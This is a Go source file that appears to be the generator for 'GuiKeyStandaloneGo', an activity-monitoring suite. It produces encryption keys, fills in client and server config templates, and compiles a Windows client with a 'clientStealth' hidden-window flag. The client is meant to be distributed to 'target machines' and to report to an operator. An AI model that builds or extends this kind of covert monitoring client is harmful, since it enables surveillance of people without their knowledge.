// File: GuiKeyStandaloneGo/generator/core/generate.go
package core

import (
	"bytes"
	"fmt"
	"html/template"
	"io"
	"log"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"time"

	"github.com/RIZAmohammadkhan/GuiKeyStandaloneGo/gui_generator_app/pkg/config"
	"github.com/RIZAmohammadkhan/GuiKeyStandaloneGo/gui_generator_app/pkg/crypto"

	"github.com/libp2p/go-libp2p/core/peer"
)

type GeneratorSettings struct {
	OutputDirPath         string
	BootstrapAddresses    string
	ClientConfigOverrides config.ClientSettings
	ServerConfigOverrides config.ServerSettings
	GoExecutablePath      string // Path to the go executable
	TemplatesBasePath     string // Base path where 'client_template' & 'server_template' dirs reside directly
	TempModuleRootPath    string // Path to the root of the temporary module (for 'go mod tidy')
	ProgressCallback      func(message string, percentage int)
}

type GeneratedInfo struct {
	AppClientID           string
	AppEncryptionKeyHex   string
	ServerPeerID          string
	ServerIdentitySeedHex string
	ReadmeContent         string
	FullOutputDir         string
}

const readmeTemplate = `Activity Monitoring Suite - Generated Packages (P2P Mode)
========================================================

This package was generated by the GuiKeyStandaloneGo Generator on {{.Timestamp}}.

Generated App-Level Client ID (for logs): {{.Generated.AppClientID}}
Generated App-Level Encryption Key (Hex): {{.Generated.AppEncryptionKeyHex}}
Generated Server Libp2p Peer ID: {{.Generated.ServerPeerID}}
Generated Server Libp2p Identity Seed (Hex): {{.Generated.ServerIdentitySeedHex}}

Instructions:
------------

1. Local Log Server (For Your Machine - The Operator):
   - The 'LocalLogServer_Package' directory contains the server application and its configuration.
   - It also contains 'web_templates' and 'static' subdirectories for the UI.
   - Run '{{.ServerExeName}}' from within this directory.
   - Server P2P Listen Address (configured): {{.ServerConfig.ListenAddress}}
   - Server Web UI Listen Address: {{.ServerConfig.WebUIListenAddress}}
   - Access Web UI at: http://{{.WebUIAccessAddress}}/logs
   - Server Bootstrap Addresses: {{range .ServerConfig.BootstrapAddresses}}{{.}} {{end}}
   - Server Diagnostic Log File: {{.ServerConfig.InternalLogFileDir}}/{{.ServerConfig.InternalLogFileName}} (Level: {{.ServerConfig.InternalLogLevel}})
     (Rotation: MaxSize={{.ServerConfigMaxDiagnosticLogSizeMBOrDefault}}MB, Backups={{.ServerConfigMaxDiagnosticLogBackupsOrDefault}}, MaxAge={{.ServerConfigMaxDiagnosticLogAgeDaysOrDefault}}days)

2. Activity Monitor Client (For Distribution to Target Machines):
   - The 'ActivityMonitorClient_Package' directory contains the client application.
   - Distribute the *contents* of this directory to the machine(s) you want to monitor.
   - Run '{{.ClientExeName}}' on the target machine(s).
   - It is configured to connect to Server Peer ID: {{.Generated.ServerPeerID}}
   - It will use these bootstrap multiaddresses: {{range .ClientConfig.BootstrapAddresses}}{{.}} {{end}}
   - Client Diagnostic Log File: {{.ClientConfig.InternalLogFileDir}}/{{.ClientConfig.InternalLogFileName}} (Level: {{.ClientConfig.InternalLogLevel}})
     (Rotation: MaxSize={{.ClientConfigMaxLogFileSizeMBOrDefault}}MB, Backups={{.ClientConfigMaxDiagnosticLogBackupsOrDefault}}, MaxAge={{.ClientConfigMaxDiagnosticLogAgeDaysOrDefault}}days)
   - Client Local Cache DB (SQLite): {{.ClientConfig.LogFilePath}} 
     (This SQLite DB is also size-managed based on the MaxLogFileSizeMB setting, aiming for ~{{.ClientConfigMaxLogFileSizeMBOrDefault}}MB before aggressive pruning)


Security Considerations:
- The app-level encryption key is vital for data confidentiality. Keep it secure.
- The server's libp2p identity seed is critical.
- Secure the machine running the Local Log Server.
- Ensure proper consent and adhere to privacy laws when deploying the client monitor.
`

const clientGeneratedConfigTemplate = `// Code generated by GuiKeyStandaloneGo generator. DO NOT EDIT.
package main 

const (
	CfgServerPeerID                       = "{{.ServerPeerID}}"
	CfgEncryptionKeyHex                   = "{{.EncryptionKeyHex}}"
	CfgClientID                           = "{{.ClientID}}"
	CfgSyncIntervalSecs                   = {{.SyncIntervalSecs}}
	CfgProcessorPeriodicFlushIntervalSecs = {{.ProcessorPeriodicFlushIntervalSecs}}
	CfgInternalLogLevel                   = "{{.InternalLogLevel}}"
	CfgLogFilePath                        = ` + "`{{.LogFilePath}}`" + ` // Path for SQLite DB
	CfgAppNameForAutorun                  = "{{.AppNameForAutorun}}"
	CfgLocalLogCacheRetentionDays         = {{.LocalLogCacheRetentionDays}} // For SQLite DB
	CfgRetryIntervalOnFailSecs            = {{.RetryIntervalOnFailSecs}}
	CfgMaxRetriesPerBatch                 = {{.MaxRetriesPerBatch}}
	CfgMaxEventsPerSyncBatch              = {{.MaxEventsPerSyncBatch}}
	CfgInternalLogFileDir                 = ` + "`{{.InternalLogFileDir}}`" + `
	CfgInternalLogFileName                = "{{.InternalLogFileName}}"
)

var CfgBootstrapAddresses = []string{
{{range .BootstrapAddresses}}	` + "`{{.}}`," + `
{{end}}}

// CfgMaxLogFileSizeMB is used by the SQLite DB size checker.
// It shares its value source with CfgDiagnosticLogMaxSizeMB from the ClientSettings (generator configuration).
{{if .MaxLogFileSizeMBIsSet}}
var CfgMaxLogFileSizeMBValue = uint64({{.MaxLogFileSizeMBValue}})
var CfgMaxLogFileSizeMB = &CfgMaxLogFileSizeMBValue 
{{else}}
var CfgMaxLogFileSizeMB *uint64 = nil // SQLite DB size check will be disabled if nil
{{end}}

// For diagnostic text log rotation (using lumberjack)
// CfgDiagnosticLogMaxSizeMB uses the value from ClientSettings.MaxLogFileSizeMB
{{if .MaxDiagnosticLogSizeMBIsSet}}
const CfgDiagnosticLogMaxSizeMB = {{.MaxDiagnosticLogSizeMBValue}} // in MB
{{else}}
const CfgDiagnosticLogMaxSizeMB = 10 // Default if not set from ClientSettings
{{end}}
{{if .MaxDiagnosticLogBackupsIsSet}}
const CfgDiagnosticLogMaxBackups = {{.MaxDiagnosticLogBackupsValue}}
{{else}}
const CfgDiagnosticLogMaxBackups = 3 // Default if not set from ClientSettings
{{end}}
{{if .MaxDiagnosticLogAgeDaysIsSet}}
const CfgDiagnosticLogMaxAgeDays = {{.MaxDiagnosticLogAgeDaysValue}} // in days
{{else}}
const CfgDiagnosticLogMaxAgeDays = 7 // Default if not set from ClientSettings
{{end}}
`

const serverGeneratedConfigTemplate = `// Code generated by GuiKeyStandaloneGo generator. DO NOT EDIT.
package main

const (
	CfgP2PListenAddress            = "{{.ListenAddress}}"
	CfgWebUIListenAddress          = "{{.WebUIListenAddress}}"
	CfgEncryptionKeyHex            = "{{.EncryptionKeyHex}}"
	CfgServerIdentityKeySeedHex    = "{{.ServerIdentityKeySeedHex}}"
	CfgDatabasePath                = ` + "`{{.DatabasePath}}`" + `
	CfgLogRetentionDays            = {{.LogRetentionDays}}
	CfgLogDeletionCheckIntervalHrs = {{.LogDeletionCheckIntervalHrs}}
	CfgInternalLogLevel            = "{{.InternalLogLevel}}"      
	CfgInternalLogFileDir          = ` + "`{{.InternalLogFileDir}}`" + `   
	CfgInternalLogFileName         = "{{.InternalLogFileName}}"      
)

var CfgBootstrapAddresses = []string{
{{range .BootstrapAddresses}}	` + "`{{.}}`," + `
{{end}}}

// For diagnostic text log rotation (using lumberjack)
{{if .MaxDiagnosticLogSizeMBIsSet}}
const CfgDiagnosticLogMaxSizeMB = {{.MaxDiagnosticLogSizeMBValue}} // in MB
{{else}}
const CfgDiagnosticLogMaxSizeMB = 20 // Default if not set from ServerSettings
{{end}}
{{if .MaxDiagnosticLogBackupsIsSet}}
const CfgDiagnosticLogMaxBackups = {{.MaxDiagnosticLogBackupsValue}}
{{else}}
const CfgDiagnosticLogMaxBackups = 5 // Default if not set from ServerSettings
{{end}}
{{if .MaxDiagnosticLogAgeDaysIsSet}}
const CfgDiagnosticLogMaxAgeDays = {{.MaxDiagnosticLogAgeDaysValue}} // in days
{{else}}
const CfgDiagnosticLogMaxAgeDays = 14 // Default if not set from ServerSettings
{{end}}
`

func PerformGeneration(genSettings *GeneratorSettings) (GeneratedInfo, error) {
	var genInfo GeneratedInfo
	if genSettings.ProgressCallback == nil {
		genSettings.ProgressCallback = func(message string, percentage int) {
			log.Printf("[core-progress %d%%] %s", percentage, message)
		}
	}

	genSettings.ProgressCallback("Starting generation process...", 0)
	log.Println("[core] PerformGeneration started.")

	if genSettings.OutputDirPath == "" {
		return genInfo, fmt.Errorf("output directory is not set")
	}
	if genSettings.GoExecutablePath == "" {
		log.Println("[core] WARNING: GoExecutablePath is empty. Compilation will use 'go' from PATH or fail.")
	}
	if genSettings.TemplatesBasePath == "" {
		return genInfo, fmt.Errorf("templates base path not provided (TemplatesBasePath is empty)")
	}
	if genSettings.TempModuleRootPath == "" {
		return genInfo, fmt.Errorf("temporary module root path not provided (TempModuleRootPath is empty)")
	}

	absOutputDir, err := filepath.Abs(genSettings.OutputDirPath)
	if err != nil {
		return genInfo, fmt.Errorf("failed to get absolute path for output directory %s: %w", genSettings.OutputDirPath, err)
	}
	genInfo.FullOutputDir = absOutputDir
	if err := os.MkdirAll(absOutputDir, 0755); err != nil {
		return genInfo, fmt.Errorf("failed to create output directory %s: %w", absOutputDir, err)
	}
	genSettings.ProgressCallback(fmt.Sprintf("Output directory ensured at %s", absOutputDir), 5)
	log.Printf("[core] Output directory: %s", absOutputDir)

	genInfo.AppClientID = crypto.GenerateAppClientID()
	aesKeyBytes, err := crypto.GenerateAESKeyBytes()
	if err != nil {
		return genInfo, fmt.Errorf("failed to generate AES key: %w", err)
	}
	genInfo.AppEncryptionKeyHex = fmt.Sprintf("%x", aesKeyBytes)
	genSettings.ProgressCallback("App Client ID and Encryption Key generated.", 10)

	serverIdentitySeedHex, err := crypto.GenerateLibp2pIdentitySeedHex()
	if err != nil {
		return genInfo, fmt.Errorf("failed to generate server identity seed: %w", err)
	}
	genInfo.ServerIdentitySeedHex = serverIdentitySeedHex
	serverPrivKey, _, err := crypto.Libp2pKeyFromSeedHex(serverIdentitySeedHex)
	if err != nil {
		return genInfo, fmt.Errorf("failed to derive server libp2p key: %w", err)
	}
	serverPID, err := peer.IDFromPrivateKey(serverPrivKey)
	if err != nil {
		return genInfo, fmt.Errorf("failed to get server peer ID: %w", err)
	}
	genInfo.ServerPeerID = serverPID.String()
	genSettings.ProgressCallback(fmt.Sprintf("Server Peer ID (%s) and Identity Seed generated.", genInfo.ServerPeerID), 15)
	log.Printf("[core] Generated Server Peer ID: %s", genInfo.ServerPeerID)

	clientCfgValues := config.DefaultClientSettings()
	// TODO: Apply genSettings.ClientConfigOverrides here if provided
	clientCfgValues.ClientID = genInfo.AppClientID
	clientCfgValues.EncryptionKeyHex = genInfo.AppEncryptionKeyHex
	clientCfgValues.ServerPeerID = genInfo.ServerPeerID
	if genSettings.BootstrapAddresses != "" {
		addrs := strings.Split(genSettings.BootstrapAddresses, ",")
		clientCfgValues.BootstrapAddresses = make([]string, 0, len(addrs))
		for _, addr := range addrs {
			trimmedAddr := strings.TrimSpace(addr)
			if trimmedAddr != "" {
				clientCfgValues.BootstrapAddresses = append(clientCfgValues.BootstrapAddresses, trimmedAddr)
			}
		}
	}
	// If overrides are provided, apply them (example for one field)
	if genSettings.ClientConfigOverrides.MaxLogFileSizeMB != nil {
		clientCfgValues.MaxLogFileSizeMB = genSettings.ClientConfigOverrides.MaxLogFileSizeMB
	}
	if genSettings.ClientConfigOverrides.MaxDiagnosticLogBackups != nil {
		clientCfgValues.MaxDiagnosticLogBackups = genSettings.ClientConfigOverrides.MaxDiagnosticLogBackups
	}
	if genSettings.ClientConfigOverrides.MaxDiagnosticLogAgeDays != nil {
		clientCfgValues.MaxDiagnosticLogAgeDays = genSettings.ClientConfigOverrides.MaxDiagnosticLogAgeDays
	}
	genSettings.ProgressCallback("Client configuration values prepared.", 20)

	serverCfgValues := config.DefaultServerSettings()
	// TODO: Apply genSettings.ServerConfigOverrides here if provided
	serverCfgValues.EncryptionKeyHex = genInfo.AppEncryptionKeyHex
	serverCfgValues.ServerIdentityKeySeedHex = genInfo.ServerIdentitySeedHex
	if len(clientCfgValues.BootstrapAddresses) > 0 {
		serverCfgValues.BootstrapAddresses = make([]string, len(clientCfgValues.BootstrapAddresses))
		copy(serverCfgValues.BootstrapAddresses, clientCfgValues.BootstrapAddresses)
	} else {
		serverCfgValues.BootstrapAddresses = []string{}
	}
	// Apply overrides for server diagnostic logs
	if genSettings.ServerConfigOverrides.MaxDiagnosticLogSizeMB != nil {
		serverCfgValues.MaxDiagnosticLogSizeMB = genSettings.ServerConfigOverrides.MaxDiagnosticLogSizeMB
	}
	if genSettings.ServerConfigOverrides.MaxDiagnosticLogBackups != nil {
		serverCfgValues.MaxDiagnosticLogBackups = genSettings.ServerConfigOverrides.MaxDiagnosticLogBackups
	}
	if genSettings.ServerConfigOverrides.MaxDiagnosticLogAgeDays != nil {
		serverCfgValues.MaxDiagnosticLogAgeDays = genSettings.ServerConfigOverrides.MaxDiagnosticLogAgeDays
	}
	genSettings.ProgressCallback("Server configuration values prepared.", 25)

	clientSrcPath := filepath.Join(genSettings.TemplatesBasePath, "client_template")
	serverSrcPath := filepath.Join(genSettings.TemplatesBasePath, "server_template")

	log.Printf("[core] Using TemplatesBasePath from settings: %s", genSettings.TemplatesBasePath)
	log.Printf("[core] Resolved client_template source path for build: %s", clientSrcPath)
	log.Printf("[core] Resolved server_template source path for build: %s", serverSrcPath)

	if _, errStat := os.Stat(clientSrcPath); os.IsNotExist(errStat) {
		err := fmt.Errorf("client template source path does not exist: '%s'. Check TemplatesBasePath ('%s') and ensure 'client_template' subdirectory is present and extracted correctly", clientSrcPath, genSettings.TemplatesBasePath)
		log.Printf("[core] ERROR: %v", err)
		return genInfo, err
	}
	if _, errStat := os.Stat(serverSrcPath); os.IsNotExist(errStat) {
		err := fmt.Errorf("server template source path does not exist: '%s'. Check TemplatesBasePath ('%s') and ensure 'server_template' subdirectory is present and extracted correctly", serverSrcPath, genSettings.TemplatesBasePath)
		log.Printf("[core] ERROR: %v", err)
		return genInfo, err
	}

	clientExeName := "activity_monitor_client.exe"
	serverExeName := "local_log_server.exe"

	clientPackagePath := filepath.Join(absOutputDir, "ActivityMonitorClient_Package")
	serverPackagePath := filepath.Join(absOutputDir, "LocalLogServer_Package")

	if err := os.MkdirAll(clientPackagePath, 0755); err != nil {
		return genInfo, fmt.Errorf("failed to create client package dir: %w", err)
	}
	if err := os.MkdirAll(serverPackagePath, 0755); err != nil {
		return genInfo, fmt.Errorf("failed to create server package dir: %w", err)
	}
	genSettings.ProgressCallback("Package directories created.", 30)

	clientTemplateData := struct {
		config.ClientSettings
		MaxLogFileSizeMBIsSet        bool
		MaxLogFileSizeMBValue        uint64
		MaxDiagnosticLogSizeMBIsSet  bool
		MaxDiagnosticLogSizeMBValue  uint64
		MaxDiagnosticLogBackupsIsSet bool
		MaxDiagnosticLogBackupsValue int
		MaxDiagnosticLogAgeDaysIsSet bool
		MaxDiagnosticLogAgeDaysValue int
	}{ClientSettings: clientCfgValues}

	if clientCfgValues.MaxLogFileSizeMB != nil {
		clientTemplateData.MaxLogFileSizeMBIsSet = true
		clientTemplateData.MaxLogFileSizeMBValue = *clientCfgValues.MaxLogFileSizeMB
	}
	if clientCfgValues.MaxLogFileSizeMB != nil { // Re-using for diagnostic log size
		clientTemplateData.MaxDiagnosticLogSizeMBIsSet = true
		clientTemplateData.MaxDiagnosticLogSizeMBValue = *clientCfgValues.MaxLogFileSizeMB
	}
	if clientCfgValues.MaxDiagnosticLogBackups != nil {
		clientTemplateData.MaxDiagnosticLogBackupsIsSet = true
		clientTemplateData.MaxDiagnosticLogBackupsValue = *clientCfgValues.MaxDiagnosticLogBackups
	}
	if clientCfgValues.MaxDiagnosticLogAgeDays != nil {
		clientTemplateData.MaxDiagnosticLogAgeDaysIsSet = true
		clientTemplateData.MaxDiagnosticLogAgeDaysValue = *clientCfgValues.MaxDiagnosticLogAgeDays
	}

	clientGeneratedGoPath := filepath.Join(clientSrcPath, "config_generated.go")
	if err := writeGoConfig(clientGeneratedGoPath, clientGeneratedConfigTemplate, clientTemplateData); err != nil {
		return genInfo, fmt.Errorf("failed to write client_generated_config.go: %w", err)
	}
	genSettings.ProgressCallback("Client Go config file generated.", 35)
	log.Printf("[core] Wrote client config to: %s", clientGeneratedGoPath)

	serverTemplateData := struct {
		config.ServerSettings
		MaxDiagnosticLogSizeMBIsSet  bool
		MaxDiagnosticLogSizeMBValue  uint64
		MaxDiagnosticLogBackupsIsSet bool
		MaxDiagnosticLogBackupsValue int
		MaxDiagnosticLogAgeDaysIsSet bool
		MaxDiagnosticLogAgeDaysValue int
	}{ServerSettings: serverCfgValues}

	if serverCfgValues.MaxDiagnosticLogSizeMB != nil {
		serverTemplateData.MaxDiagnosticLogSizeMBIsSet = true
		serverTemplateData.MaxDiagnosticLogSizeMBValue = *serverCfgValues.MaxDiagnosticLogSizeMB
	}
	if serverCfgValues.MaxDiagnosticLogBackups != nil {
		serverTemplateData.MaxDiagnosticLogBackupsIsSet = true
		serverTemplateData.MaxDiagnosticLogBackupsValue = *serverCfgValues.MaxDiagnosticLogBackups
	}
	if serverCfgValues.MaxDiagnosticLogAgeDays != nil {
		serverTemplateData.MaxDiagnosticLogAgeDaysIsSet = true
		serverTemplateData.MaxDiagnosticLogAgeDaysValue = *serverCfgValues.MaxDiagnosticLogAgeDays
	}

	serverGeneratedGoPath := filepath.Join(serverSrcPath, "config_generated.go")
	if err := writeGoConfig(serverGeneratedGoPath, serverGeneratedConfigTemplate, serverTemplateData); err != nil {
		return genInfo, fmt.Errorf("failed to write server_generated_config.go: %w", err)
	}
	genSettings.ProgressCallback("Server Go config file generated.", 40)
	log.Printf("[core] Wrote server config to: %s", serverGeneratedGoPath)

	defer func() {
		log.Printf("[core] Attempting to remove temporary config file: %s", clientGeneratedGoPath)
		if err := os.Remove(clientGeneratedGoPath); err != nil && !os.IsNotExist(err) {
			log.Printf("[core] WARNING: Failed to remove client_generated_config.go: %v", err)
		}
		log.Printf("[core] Attempting to remove temporary config file: %s", serverGeneratedGoPath)
		if err := os.Remove(serverGeneratedGoPath); err != nil && !os.IsNotExist(err) {
			log.Printf("[core] WARNING: Failed to remove server_generated_config.go: %v", err)
		}
		genSettings.ProgressCallback("Cleaned up temporary Go config files.", 98)
	}()

	clientOutPath := filepath.Join(clientPackagePath, clientExeName)
	serverOutPath := filepath.Join(serverPackagePath, serverExeName)

	genSettings.ProgressCallback("Ensuring module dependencies (go mod tidy)...", 42)
	if err := runGoModTidy(genSettings.TempModuleRootPath, genSettings.GoExecutablePath); err != nil {
		return genInfo, fmt.Errorf("failed to run 'go mod tidy': %w", err)
	}
	genSettings.ProgressCallback("Module dependencies ensured.", 45)

	genSettings.ProgressCallback(fmt.Sprintf("Compiling client template from %s...", clientSrcPath), 45)
	if err := compileGoTemplate(clientSrcPath, clientOutPath, true, genSettings.GoExecutablePath); err != nil {
		return genInfo, fmt.Errorf("failed to compile client template: %w", err)
	}
	genSettings.ProgressCallback("Client template compiled.", 60)

	genSettings.ProgressCallback(fmt.Sprintf("Compiling server template from %s...", serverSrcPath), 65)
	if err := compileGoTemplate(serverSrcPath, serverOutPath, false, genSettings.GoExecutablePath); err != nil {
		return genInfo, fmt.Errorf("failed to compile server template: %w", err)
	}
	genSettings.ProgressCallback("Server template compiled.", 80)

	serverPackageStaticDir := filepath.Join(serverPackagePath, "static")
	serverPackageTemplatesDir := filepath.Join(serverPackagePath, "web_templates")

	sourceStaticDir := filepath.Join(serverSrcPath, "static")
	sourceWebTemplatesDir := filepath.Join(serverSrcPath, "web_templates")
	log.Printf("[core] Copying server static assets from: %s", sourceStaticDir)
	log.Printf("[core] Copying server web templates from: %s", sourceWebTemplatesDir)

	if err := copyDir(sourceStaticDir, serverPackageStaticDir); err != nil {
		log.Printf("[core] Warning: Failed to copy server static assets from %s: %v", sourceStaticDir, err)
	}
	if err := copyDir(sourceWebTemplatesDir, serverPackageTemplatesDir); err != nil {
		log.Printf("[core] Warning: Failed to copy server HTML templates from %s: %v", sourceWebTemplatesDir, err)
	}
	genSettings.ProgressCallback("Server UI assets copied.", 85)

	readmeData := struct {
		Timestamp                                    string
		Generated                                    GeneratedInfo
		ClientConfig                                 config.ClientSettings
		ServerConfig                                 config.ServerSettings
		ClientExeName                                string
		ServerExeName                                string
		WebUIAccessAddress                           string
		ClientConfigMaxLogFileSizeMBOrDefault        uint64
		ClientConfigMaxDiagnosticLogBackupsOrDefault int
		ClientConfigMaxDiagnosticLogAgeDaysOrDefault int
		ServerConfigMaxDiagnosticLogSizeMBOrDefault  uint64
		ServerConfigMaxDiagnosticLogBackupsOrDefault int
		ServerConfigMaxDiagnosticLogAgeDaysOrDefault int
	}{
		Timestamp:                             time.Now().Format(time.RFC1123),
		Generated:                             genInfo,
		ClientConfig:                          clientCfgValues, // Pass the struct itself
		ServerConfig:                          serverCfgValues, // Pass the struct itself
		ClientExeName:                         clientExeName,
		ServerExeName:                         serverExeName,
		WebUIAccessAddress:                    strings.Replace(serverCfgValues.WebUIListenAddress, "0.0.0.0", "127.0.0.1", 1),
		ClientConfigMaxLogFileSizeMBOrDefault: clientCfgValues.GetMaxLogFileSizeMBOrDefault(),
		ClientConfigMaxDiagnosticLogBackupsOrDefault: clientCfgValues.GetMaxDiagnosticLogBackupsOrDefault(),
		ClientConfigMaxDiagnosticLogAgeDaysOrDefault: clientCfgValues.GetMaxDiagnosticLogAgeDaysOrDefault(),
		ServerConfigMaxDiagnosticLogSizeMBOrDefault:  serverCfgValues.GetMaxDiagnosticLogSizeMBOrDefault(),
		ServerConfigMaxDiagnosticLogBackupsOrDefault: serverCfgValues.GetMaxDiagnosticLogBackupsOrDefault(),
		ServerConfigMaxDiagnosticLogAgeDaysOrDefault: serverCfgValues.GetMaxDiagnosticLogAgeDaysOrDefault(),
	}

	tmplReadme, err := template.New("readme").Parse(readmeTemplate)
	if err != nil {
		return genInfo, fmt.Errorf("failed to parse README template: %w", err)
	}
	var readmeBuf bytes.Buffer
	if err := tmplReadme.Execute(&readmeBuf, readmeData); err != nil {
		return genInfo, fmt.Errorf("failed to execute README template to buffer: %w", err)
	}
	genInfo.ReadmeContent = readmeBuf.String()

	readmeFilePath := filepath.Join(absOutputDir, "README_IMPORTANT_INSTRUCTIONS.txt")
	readmeFile, err := os.Create(readmeFilePath)
	if err != nil {
		return genInfo, fmt.Errorf("failed to create README file %s: %w", readmeFilePath, err)
	}
	defer readmeFile.Close()
	if _, err := readmeFile.WriteString(genInfo.ReadmeContent); err != nil {
		return genInfo, fmt.Errorf("failed to write README content to file: %w", err)
	}
	genSettings.ProgressCallback("README generated.", 95)
	log.Printf("[core] Wrote README to: %s", readmeFilePath)

	finalMsg := fmt.Sprintf("Generation process completed successfully! Packages in: %s", absOutputDir)
	genSettings.ProgressCallback(finalMsg, 100)
	log.Printf("[core] %s", finalMsg)
	return genInfo, nil
}

func writeGoConfig(path string, goTemplateContent string, cfgData interface{}) error {
	tmpl, err := template.New("goconfig").Parse(goTemplateContent)
	if err != nil {
		return fmt.Errorf("parsing Go config template for %s: %w", filepath.Base(path), err)
	}
	parentDir := filepath.Dir(path)
	if err := os.MkdirAll(parentDir, 0755); err != nil {
		log.Printf("[core] Info: Attempted to create parent dir %s for generated Go config (might already exist or path is wrong)", parentDir)
	}
	file, err := os.Create(path)
	if err != nil {
		return fmt.Errorf("creating generated Go config file %s: %w", path, err)
	}
	defer file.Close()
	if err := tmpl.Execute(file, cfgData); err != nil {
		return fmt.Errorf("executing Go config template for %s: %w", filepath.Base(path), err)
	}
	return nil
}

func runGoModTidy(moduleDir string, goExecutable string) error {
	effectiveGoExecutable := goExecutable
	if effectiveGoExecutable == "" {
		effectiveGoExecutable = "go"
		log.Printf("[core-gomod] GoExecutablePath not provided, defaulting to '%s' from PATH for 'go mod tidy'", effectiveGoExecutable)
	}

	cmd := exec.Command(effectiveGoExecutable, "mod", "tidy")
	cmd.Dir = moduleDir
	cmd.Env = append(os.Environ(), "GOOS=windows", "GOARCH=amd64", "CGO_ENABLED=0")

	var stdout bytes.Buffer
	var stderr bytes.Buffer
	cmd.Stdout = &stdout
	cmd.Stderr = &stderr

	log.Printf("[core-gomod] Running 'go mod tidy': %s mod tidy (Env: GOOS=%s GOARCH=%s CGO_ENABLED=%s) in %s",
		effectiveGoExecutable,
		buildEnvValueFor("GOOS", cmd.Env), buildEnvValueFor("GOARCH", cmd.Env),
		buildEnvValueFor("CGO_ENABLED", cmd.Env),
		cmd.Dir)

	startTime := time.Now()
	if err := cmd.Run(); err != nil {
		errMsg := fmt.Sprintf("failed to run 'go mod tidy' in %s (command: %s mod tidy): %v\nStdout: %s\nStderr: %s",
			moduleDir, effectiveGoExecutable, err, stdout.String(), stderr.String())
		log.Printf("[core-gomod] ERROR: %s", errMsg)
		return fmt.Errorf(errMsg)
	}
	duration := time.Since(startTime)
	log.Printf("[core-gomod] Successfully ran 'go mod tidy' in %s in %v. Output:\n%s", moduleDir, duration, stdout.String())
	if stderr.Len() > 0 {
		log.Printf("[core-gomod] Stderr during 'go mod tidy' in %s:\n%s", moduleDir, stderr.String())
	}
	return nil
}

func compileGoTemplate(srcDir, outputPath string, clientStealth bool, goExecutable string) error {
	effectiveGoExecutable := goExecutable
	if effectiveGoExecutable == "" {
		effectiveGoExecutable = "go"
		log.Printf("[core-compile] GoExecutablePath not provided, defaulting to '%s' from PATH for compiling %s", effectiveGoExecutable, srcDir)
	}

	args := []string{"build", "-v", "-o", outputPath}
	buildEnv := append(os.Environ(), "GOOS=windows", "GOARCH=amd64", "CGO_ENABLED=0")

	var ldflags []string
	if clientStealth {
		ldflags = append(ldflags, "-H=windowsgui")
	}
	ldflags = append(ldflags, "-s", "-w")

	if len(ldflags) > 0 {
		args = append(args, "-ldflags="+strings.Join(ldflags, " "))
	}
	args = append(args, ".")

	cmd := exec.Command(effectiveGoExecutable, args...)
	cmd.Dir = srcDir
	cmd.Env = buildEnv

	var stdout bytes.Buffer
	var stderr bytes.Buffer
	cmd.Stdout = &stdout
	cmd.Stderr = &stderr

	log.Printf("[core-compile] Running build: %s %s (Env: GOOS=%s GOARCH=%s CGO_ENABLED=%s) in %s",
		effectiveGoExecutable, strings.Join(args, " "),
		buildEnvValueFor("GOOS", cmd.Env), buildEnvValueFor("GOARCH", cmd.Env),
		buildEnvValueFor("CGO_ENABLED", cmd.Env),
		cmd.Dir)

	startTime := time.Now()
	if err := cmd.Run(); err != nil {
		errMsg := fmt.Sprintf("failed to compile %s (command: %s %s): %v\nStdout: %s\nStderr: %s",
			filepath.Base(srcDir), effectiveGoExecutable, strings.Join(args, " "), err, stdout.String(), stderr.String())
		log.Printf("[core-compile] ERROR: %s", errMsg)
		return fmt.Errorf(errMsg)
	}
	duration := time.Since(startTime)
	log.Printf("[core-compile] Successfully compiled %s to %s in %v. Output:\n%s", filepath.Base(srcDir), outputPath, duration, stdout.String())
	if stderr.Len() > 0 {
		log.Printf("[core-compile] Stderr during compilation of %s:\n%s", filepath.Base(srcDir), stderr.String())
	}
	return nil
}

func buildEnvValueFor(key string, env []string) string {
	prefix := key + "="
	for _, entry := range env {
		if strings.HasPrefix(entry, prefix) {
			return entry[len(prefix):]
		}
	}
	return ""
}

func copyDir(src string, dst string) error {
	srcInfo, err := os.Stat(src)
	if err != nil {
		if os.IsNotExist(err) {
			log.Printf("[core-copy] Info: Source directory %s does not exist, skipping copy.", src)
			return nil
		}
		return fmt.Errorf("stating source dir %s: %w", src, err)
	}
	if !srcInfo.IsDir() {
		return fmt.Errorf("source %s is not a directory", src)
	}
	if err := os.MkdirAll(dst, srcInfo.Mode()); err != nil {
		return fmt.Errorf("creating dest dir %s: %w", dst, err)
	}
	entries, err := os.ReadDir(src)
	if err != nil {
		return fmt.Errorf("reading source dir %s: %w", src, err)
	}
	for _, entry := range entries {
		srcPath := filepath.Join(src, entry.Name())
		dstPath := filepath.Join(dst, entry.Name())
		if entry.IsDir() {
			if err := copyDir(srcPath, dstPath); err != nil {
				return err
			}
		} else {
			srcFile, errF := os.Open(srcPath)
			if errF != nil {
				return fmt.Errorf("opening source file %s: %w", srcPath, errF)
			}
			dstFile, errC := os.Create(dstPath)
			if errC != nil {
				srcFile.Close()
				return fmt.Errorf("creating dest file %s: %w", dstPath, errC)
			}
			if _, errCP := io.Copy(dstFile, srcFile); errCP != nil {
				srcFile.Close()
				dstFile.Close()
				return fmt.Errorf("copying %s to %s: %w", srcPath, dstPath, errCP)
			}
			srcFile.Close()
			dstFile.Close()
			fileInfo, errI := entry.Info()
			if errI == nil {
				if errC := os.Chmod(dstPath, fileInfo.Mode()); errC != nil {
					log.Printf("[core-copy] Warning: could not chmod %s: %v", dstPath, errC)
				}
			} else {
				log.Printf("[core-copy] Warning: could not get FileInfo for %s to copy mode: %v", srcPath, errI)
			}
		}
	}
	return nil
}
